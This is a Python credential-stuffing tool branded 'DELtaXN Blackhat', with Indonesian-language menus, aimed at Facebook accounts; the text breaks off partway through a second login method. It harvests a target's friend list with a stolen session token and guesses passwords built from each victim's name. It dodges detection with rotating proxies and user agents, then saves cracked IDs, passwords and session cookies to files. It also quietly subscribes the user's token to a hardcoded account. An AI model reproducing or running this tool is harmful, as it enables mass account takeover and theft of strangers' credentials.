#-----------------[ IMPORT MODULE ]-----------------#
import requests,bs4,json,os,sys,random,datetime,time,re,rich
from time import sleep
from rich.tree import Tree
from rich.panel import Panel
from rich import print as prints
from rich import print as cetak
from rich.text import Text as tekz
from rich.progress import track
from rich.text import Text
from rich.panel import Panel as panel
from rich.panel import Panel as nel
from rich.columns import Columns
from rich.console import Console 
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Console as sol
from bs4 import BeautifulSoup as parser
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
#-----------------[ GLOBAL NAME ]-----------------#
abah=[]
fang=[]
ses=requests.Session()
console = Console()
ugen,ugen2=[],[]
id,id2,uid=[],[],[]
akun=[]
loop,ok,cp=0,0,0
ualuh,ualu=[],[]
tokenku,method,pwpluss,pwnya=[],[],[],[]
sys.stdout.write('\x1b]2; DELtaXN Blackhat\x07')
#-----------------[ USER AGENT DAN PROXY ]-----------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=socks4&country=all&anonymity=all&timeout=20000').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('Jaringan Anda Sangat Ngelag, Coba Periksa Kuota Dan Jaringan Anda');exit()
prox=open('.prox.txt','r').read().splitlines()
for delta in range(10000):
    rr = random.randint
    rc = random.choice
    andro =  rc(["9","10","11","12","13","14"])
    model = rc(["SM-A115AP","SM-A115M","SM-A115F","SM-A115AZ"])
    build = rc(["QP1A.190711.020; wv","RP1A.200720.012; wv"])
    u1 = f"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0"
    u2 = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
    u3 = f"Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1"
    u4 = f"Dalvik/2.1.0 (Linux; U; Android 11; F1 Prime 4G Build/RP1A.201005.001)"
    u5 = f"Dalvik/2.1.0 (Linux; U; Android 14; Pixel 4a Build/UQ1A.240205.004)"
    u6 = f"Dalvik/2.1.0 (Linux; U; Android 14; SM-A156W Build/UP1A.231005.007)"
    laso = rc([u1,u2,u3,u4,u5,u6])
    ugen.append(laso)

for x in range(10):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#-----------------[ WARNA V1 ]-----------------#
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#-----------------[ WARNA V2 ]-----------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,b,u])
#-----------------[ CONVERTER ]-----------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ SUPPORTING SCRIPT ]---------------#
def back():
	login3()
def clear():
	os.system('clear')
#------------------[ BANNER ]---------------#
def banner():
	prints(panel(f"[bold white]>>> Author : DELtaXN \n>>> Telegram : Delta XN \n>>> Facebook : Febryven Greyno \n>>> WhatsApp : 081342791377",width=45,title=f"[bold green]•[bold yellow]•[bold red]•Data Author[bold green]•[bold yellow]•[bold red]•",style=f"bold white"))
#------------------[ LOGIN COOKIES ]---------------#
def login3():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()


def login_lagi334():
	try:
		
		asu = random.choice([m,k,h,b,u])
		os.system('clear')
		banner()
		prints(panel(f"\t[bold white]>>> Disarankan Login Pakai Cookies Yang Fresh, Dan Jangan Lpgin Pakai Akun Pribadi <<<",title=f"[bold green]•[bold yellow]•[bold red]•Pesan[bold green]•[bold yellow]•[bold red]•",style=f"bold white"))
		cookie=input(f">>> Masukkan Cookies : {h}")
		open(".cok.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open(".token.txt", "w").write(token)
					print('%sLogin Succes%s'%(h, p))

				else:
					print('%sGagal Mengambil Token, Harap Login Ulang%s'%(m, p))

			except:
				print('Gagal mengambil Token, Harap Login Ulang')

		print(f'{h}!!!LOGIN SUCCES!!!');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
		print(e)
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ MENU BOKEB ]---------------#
def menu(sy2,sy3):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('>>> Cookies Kedaluarsa')
		time.sleep(3)
		login3()
	clear();banner()
	info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
	nama = info_datafb["name"]
	id = info_datafb["id"]
	ip = requests.get("http://ip-api.com/json/").json()["query"]
	abah.append(panel(f"[bold white]>>> My Ip : {ip} \n>>> Nama : {nama} \n>>> Id : {id}",width=45,title=f"[bold green]•[bold yellow]•[bold red]•Data Akun[bold green]•[bold yellow]•[bold red]•",style=f"bold white"))
	console.print(Columns(abah))
	prints(panel(f"[bold white]BrayennnXD, Alvino_Xy, Basari-ID, ARAIIXYZZ, FiiXc4You, Asep Yusup, Razor, AOREC-XD",title=f"[bold green]•[bold yellow]•[bold red]•Terima Kasih[bold green]•[bold yellow]•[bold red]•",style=f"bold white"))
	prints(panel(f"[bold white]>>> 1.Crack Publik",width=25,style=f"bold white"))
	prints(panel(f"[bold white]>>> 2.Crack Massal",width=25,style=f"bold white"))
	prints(panel(f"[bold white]>>> 3.Check Result",width=25,style=f"bold white"))
	prints(panel(f"[bold white]>>> 4.Ganti Cookies",width=25,style=f"bold white"))
	crazy = input(f'>>> Pilih : ')
	if crazy in ['1']:
		idt = input('\n>>> Masukkan Id Target : ')
		dump(idt,"",{"cookie":cok},token)
		setting()
	elif crazy in ['2']:
		dump_massal()
	elif crazy in ['3']:
		result()
	elif crazy in ['4']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f'>>> Sukses Keluar')
		time.sleep(3)
		back()
	else:
		print(f'>>> Milih Yang Benarlah Memek')
		time.sleep(3)
		exit()
#------------------[ CRACK PUBLIK ]---------------#
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r>>> TERKUMPUL {h}{len(id)}{P} ID{P}"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass


#------------------[ CHECK RESULT ]---------------#
def result():
	prints(panel(f"[bold white]>>> 1.Check Hasil OK \n>>>2.Check Hasil CP \n>>> 3.Kembali Kemenu",width=35,title=f"[bold red][ DeltaaXN Result ]",style=f"bold red"))
	kz = input(f'\n {P}[{x}{H}?{x}{P}]{x} {P}select{x} : ')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' >>> File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' >>> Anda Tidak Memiliki Hasil CP ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f'\n{P}{x}{H} >>> {x}{P}{x} {P}Select{x} : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' >>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(' >>> File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(' >>> File Tidak Di Temukan ')
			time.sleep(4)
			back()
		if len(vin)==0:
			print(' >>> Anda Tidak Mempunyai File OK ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<80:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n >>> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' >>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(' >>> File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}USER-AGENT : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['3','03']:
		back()
	else:
		print(' >>>  Pilih Yang Bener Kontol ')
		exit()
#------------------[ SETTING ]---------------#
def setting():
	print('')
	prints(panel(f"[bold white]>>> 1.Crack Id Old([bold red]Not Recommended[bold white])",title=f"[bold green]•[bold yellow]•[bold red]•Id V1[bold green]•[bold yellow]•[bold red]•",style=f"bold white"))
	prints(panel(f"[bold white]>>> 2.Crack Id New([bold yellow]Recommended[bold white])",title=f"[bold green]•[bold yellow]•[bold red]•Id V2[bold green]•[bold yellow]•[bold red]•",style=f"bold white"))
	prints(panel(f"[bold white]>>> 3.Crack Id Random([bold green]Very Recommended[bold white])",title=f"[bold green]•[bold yellow]•[bold red]•Id V3[bold green]•[bold yellow]•[bold red]•",style=f"bold white"))
	hu = input(f'>>> Pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(' >>> Pilih Yang Bener Kontooll ')
		exit()
	gopal = []
	gopal.append(panel(f"[bold white]>> 1.https://m.prod.facebook.com/[[bold green]Reguler[bold white]]",width=50,title=f"[bold green]•[bold yellow]•[bold red]•Methode Reguler[bold green]•[bold yellow]•[bold red]•",style=f"bold white"))
	gopal.append(panel(f"[bold white]>> 2.https://free.prod.facebook.com/[[bold green]Validate[bold white]]",width=50,title=f"[bold green]•[bold yellow]•[bold red]•Methode Validate[bold green]•[bold yellow]•[bold red]•",style=f"bold white"))
	gopal.append(panel(f"[bold white]>> 3.https://m.prod.facebook.com/[[bold green]Async[bold white]]",width=50,title=f"[bold green]•[bold yellow]•[bold red]•Methode Async[bold green]•[bold yellow]•[bold red]•",style=f"bold white"))
	console.print(Columns(gopal))
	sumek = input(f'>>> Pilih Methode : ')
	if sumek in ['1']:
		method.append('reguler')
	elif sumek in ['2']:
		method.append('validate')
	elif sumek in ['3']:
		method.append('async')
	else:
		method.append('reguler')
	prints(panel(f"[bold white]>>> 1.Pakai Password V1([bold yellow]Recommended[bold white])",width=90,title=f"[bold green]•[bold yellow]•[bold red]•Password v1[bold green]•[bold yellow]•[bold red]•",style=f"bold white"))
	prints(panel(f"[bold white]>>> 2.Pakai Password V2([bold green]Very Recommended[bold white])",width=90,title=f"[bold green]•[bold yellow]•[bold red]•Password v2[bold green]•[bold yellow]•[bold red]•",style=f"bold white"))
	prints(panel(f"[bold white]>>> 3.Pakai Password V3([bold red]Not Recommended[bold white])",width=90,title=f"[bold green]•[bold yellow]•[bold red]•Password v3[bold green]•[bold yellow]•[bold red]•",style=f"bold white"))
	pwplus=input(f'>>> Pilih Sandi : ')
	if pwplus in ['03','3']:
		pwpluss.append('ya')
		print("Gunakan ',' Sebagai Spasi Contoh : epep,emel,pubg")
		pwku=input(f'>>> Masukkan Sandi : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
		
	print('')
	print('>>> Apakah Anda Ingin Pakai User-Agent Pribadi? y/t')
	uatambah = input(f'>>> Pilih : ')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		bzer = input(f'>>> Masukan User-Agent : ')
		ualu.append(bzer)
	else:
		ualuh.append('tidak')
	passwrd()
#------------------[ WORDLIST ]---------------#
def passwrd():
	global prog,des
	print('')
	prints(panel(f'\t[bold white]  Mode Pesawat Jika Tidak Ada Hasil/Seret',width=90,title=f"[bold green]•[bold yellow]•[bold red]•Informasi[bold green]•[bold yellow]•[bold red]•",subtitle=f"[bold green]•[bold yellow]•[bold red]•Lagi NgeCrack[bold green]•[bold yellow]•[bold red]•",style=f"bold white"))
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(" ")[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'12')
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'reguler' in method:
					pool.submit(crack,idf,pwv)
				elif 'validate' in method:
					pool.submit(dede,idf,pwv)
				elif 'async' in method:
					pool.submit(iwan,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
		print('')
	print(f'  Crack Telah Selesai,Semoga Anda Bersyukur Dengan Hasil Nya')
	print(f'  ---> {H}OK : {H}{ok} ')
	print(f'  ---> {K}CP : {K}{cp} ')
#------------------[ METHODE 1 ]---------------#
def crack(idf,pwv):
	global loop,ok,cp
	rc = random.choice
	rr = random.randint
	cici = rc([f'{m}DELtaXN',f'{k}DELtaXN',f'{h}DELtaXN'])
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ses = requests.Session()
	prog.update(des,description=f"{cici}[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			p = ses.get('https://free.prod.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1708603684868%26e2e%3D%257B%2522init%2522%253A1708603684868%257D%26ies%3D1%26sdk%3Dandroid-16.2.0%26sso%3Dchrome_custom_tab%26nonce%3D8afdff59-f80a-4d0f-b7e6-131e51e8103c%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e4e4e3bf-f606-4822-a096-14d55737bbce%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522jqsu6g0ge79urc839f7r%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefiremax%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DTABdCdRGzjzWFX8sURAUJbO__VW5k2KBoo8bn4FagvQ%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De4e4e3bf-f606-4822-a096-14d55737bbce%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefiremax%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e4e4e3bf-f606-4822-a096-14d55737bbce%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522jqsu6g0ge79urc839f7r%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"m_ts": re.search('name="m_ts" value="(.*?)"', str(p.text)).group(1),"li": re.search('name="li" value="(.*?)"', str(p.text)).group(1),"try_number": "0","unrecognized_tries": "0","email": idf,"pass": pw,"login": "Masuk","bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			heade={'Host': 'free.prod.facebook.com','content-length': f"{len(str(dataa))}",'cache-control': 'max-age=0','dpr': '1.600000023841858','viewport-width': '980','sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '''Android''','sec-ch-ua-platform-version': '''11.0.0''','sec-ch-ua-full-version-list': '"Not;A=Brand";v="8.0.0.0", "Chromium";v="120.0.6099.43", "Google Chrome";v="120.0.6099.43"','sec-ch-prefers-color-scheme': 'light','save-data': 'on','origin': 'https://free.prod.facebook.com','dnt': '1','upgrade-insecure-requests': '1','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://free.prod.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1708603684868%26e2e%3D%257B%2522init%2522%253A1708603684868%257D%26ies%3D1%26sdk%3Dandroid-16.2.0%26sso%3Dchrome_custom_tab%26nonce%3D8afdff59-f80a-4d0f-b7e6-131e51e8103c%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e4e4e3bf-f606-4822-a096-14d55737bbce%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522jqsu6g0ge79urc839f7r%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefiremax%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DTABdCdRGzjzWFX8sURAUJbO__VW5k2KBoo8bn4FagvQ%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De4e4e3bf-f606-4822-a096-14d55737bbce%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefiremax%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e4e4e3bf-f606-4822-a096-14d55737bbce%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522jqsu6g0ge79urc839f7r%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br, zstd','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://free.prod.facebook.com/login/device-based/regular/login/?api_key=2036793259884297&auth_token=530b5712ec4bec4ae250226ed0342f66&skip_api_login=1&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1708603684868%26e2e%3D%257B%2522init%2522%253A1708603684868%257D%26ies%3D1%26sdk%3Dandroid-16.2.0%26sso%3Dchrome_custom_tab%26nonce%3D8afdff59-f80a-4d0f-b7e6-131e51e8103c%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e4e4e3bf-f606-4822-a096-14d55737bbce%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522jqsu6g0ge79urc839f7r%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefiremax%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DTABdCdRGzjzWFX8sURAUJbO__VW5k2KBoo8bn4FagvQ%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De4e4e3bf-f606-4822-a096-14d55737bbce%26tp%3Dunspecified&refsrc=deprecated&app_id=2036793259884297&cancel=fbconnect%3A%2F%2Fcct.com.dts.freefiremax%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e4e4e3bf-f606-4822-a096-14d55737bbce%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522jqsu6g0ge79urc839f7r%2522%257D&lwv=100&locale2=id_ID&refid=9',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				prints(panel(f"[bold yellow]ID : {idf} \nPASSWORD : {pw} \nUA : {ua}",title=f"[bold yellow][ DELtaXN CP ]",style=f"bold yellow"))
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"  ")
				prints(panel(f"[bold green]ID : {idf} \nPASSWORD : {pw} \nUA : {ua} \nCOOKIES : {kuki}",title=f"[bold green][ DELtaXN OK ]",style=f"bold green"))
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#------------------[ METHODE 2 ]---------------#
def dede(idf,pwv):
	global loop,ok,cp
	rc = random.choice
	rr = random.randint
	cici = rc([f'{m}DELtaXN2',f'{k}DELtaXN2',f'{h}DELtaXN2'])
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ses = requests.Session()
	prog.update(des,description=f"{cici}[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
